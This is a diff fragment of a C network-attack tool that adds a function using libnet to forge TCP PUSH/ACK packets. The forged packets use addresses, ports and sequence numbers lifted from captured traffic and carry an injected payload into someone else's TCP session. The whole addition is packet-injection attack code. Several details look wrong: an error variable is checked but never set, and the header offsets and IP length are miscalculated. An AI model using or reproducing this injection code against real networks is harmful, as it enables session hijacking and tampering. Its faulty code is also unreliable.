@@ -160,6 +160,79 @@ void attack_packet(libnet_t* l, struct pcap_pkthdr* cap_header, const u_char* pa
 	libnet_clear_packet(l);
 }
 
+// launch_generic(args, packet, package->payload, pk_size.app_header_len, out);
+void attack_packet_header(libnet_t* l, const u_char* packet, u_char* payload) {
+
+	struct packet_info packetinfo;
+	calculate_packet_sizes(packet, &packetinfo);
+	const u_char *app_begin = packet + LIBNET_ETH_H + LIBNET_TCP_H + packetinfo.tcp_header_len;
+
+	// packetinfo.app_header_len will be ack increment
+	
+
+	struct ip_hdr* ipheader;
+	struct tcp_hdr* tcpheader;
+	libnet_ptag_t t;
+
+	ipheader = (struct ip_hdr*) (packet + LIBNET_ETH_H);
+	tcpheader = (struct tcp_hdr*) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
+
+	libnet_build_tcp(
+		ntohs(tcpheader->tcp_dst_port),
+		ntohs(tcpheader->tcp_src_port),
+		ntohl(tcpheader->tcp_ack),
+		ntohl(tcpheader->tcp_seq) + packetinfo.app_header_len,
+		TCP_PUSH | TCP_ACK,
+		50000,
+		0,
+		0,
+		0,
+		(uint8_t *) payload,
+		strlen(payload),
+		l,
+		0
+	);
+
+	if (t == -1) {
+		printf("Problem creating TCP layer: %s\n",
+			libnet_geterror(l)
+		);
+		exit(1);
+	}
+
+	libnet_build_ipv4(
+		LIBNET_TCP_H,
+		IPTOS_LOWDELAY,
+		libnet_get_prand(LIBNET_PRu16),
+		0,
+		255,
+		IPPROTO_TCP,
+		0,
+		*((u_long*) &(ipheader->ip_dst_addr)),
+		*((u_long*) &(ipheader->ip_src_addr)),
+		NULL,
+		0,
+		l,
+		0
+	);
+
+	if (t == -1) {
+		printf("Problem creating IP layer: %s\n",
+			libnet_geterror(l)
+		);
+		exit(1);
+	}
+
+	if (libnet_write(l) == -1) {
+		printf("Problem writing packet: %s\n",
+			libnet_geterror(l)
+		);
+		exit(1);
+	}
+	libnet_clear_packet(l);
+}
+
+
 
 
 /*
